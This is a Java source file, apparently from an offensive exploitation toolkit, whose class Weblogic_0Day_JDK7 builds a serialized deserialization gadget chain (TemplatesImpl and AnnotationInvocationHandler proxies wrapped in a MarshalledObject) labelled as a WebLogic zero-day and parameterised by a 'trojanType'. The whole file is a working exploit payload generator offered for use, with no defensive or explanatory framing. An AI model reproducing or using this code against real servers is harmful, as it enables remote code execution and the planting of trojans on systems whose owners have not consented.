package core.payloads;

import core.enumtypes.PayloadType;
import core.gadgets.utils.Gadgets;
import core.gadgets.utils.Reflections;
import core.utils.Util;

import javax.xml.transform.Templates;
import java.lang.reflect.InvocationHandler;
import java.rmi.MarshalledObject;
import java.util.HashMap;
import java.util.LinkedHashSet;

public class  Weblogic_0Day_JDK7 {
    public static Object getObject_(PayloadType type, String trojanType) throws Exception {
        Object templates = Gadgets.createTemplatesImpl(type, trojanType);
        String zeroHashCodeStr = "f5a5a608";
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");
        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);
        LinkedHashSet set = new LinkedHashSet();
        set.add(templates);
        set.add(proxy);
        map.put(zeroHashCodeStr, templates);

        return set;
    }

    public static Object getObject(PayloadType type, String trojanType) throws Exception {
        Object var2 = getObject_(type, trojanType);
        var2=new MarshalledObject(var2);
        String zeroHashCodeStr = "f5a5a608";
        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");
        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", MarshalledObject.class);
        Object proxy = Gadgets.createProxy(tempHandler, Override.class);
        LinkedHashSet set = new LinkedHashSet();
        set.add(var2);
        set.add(proxy);
        map.put(zeroHashCodeStr, var2); // swap in real object

        return set;
    }

    public static byte[] getByte(PayloadType type, String trojanType) throws Exception {
        return Util.serialize(getObject(type, trojanType));
    }
}
